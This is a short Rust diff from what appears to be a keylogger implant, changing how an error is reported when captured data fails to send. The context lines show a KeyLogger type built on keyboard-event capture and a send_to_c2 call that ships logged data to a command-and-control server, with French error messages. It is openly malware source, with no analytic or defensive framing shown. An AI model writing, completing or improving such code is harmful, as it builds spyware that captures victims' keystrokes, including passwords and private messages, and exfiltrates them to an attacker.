@@ -1,5 +1,5 @@
 use crate::connexion::{send_directive_status, send_to_c2};
-use anyhow::{Context, Result};
+use anyhow::Result;
 use rdev::{Event, EventType, Key};
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex};
@@ -71,7 +71,7 @@ impl KeyLogger {
 
         send_to_c2(data.into_bytes())
             .await
-            .context("Erreur lors de l'envoi au C2")?;
+            .map_err(|e| anyhow::anyhow!("Erreur lors de l'envoi au C2: {}", e))?;
 
         Ok(())
     }
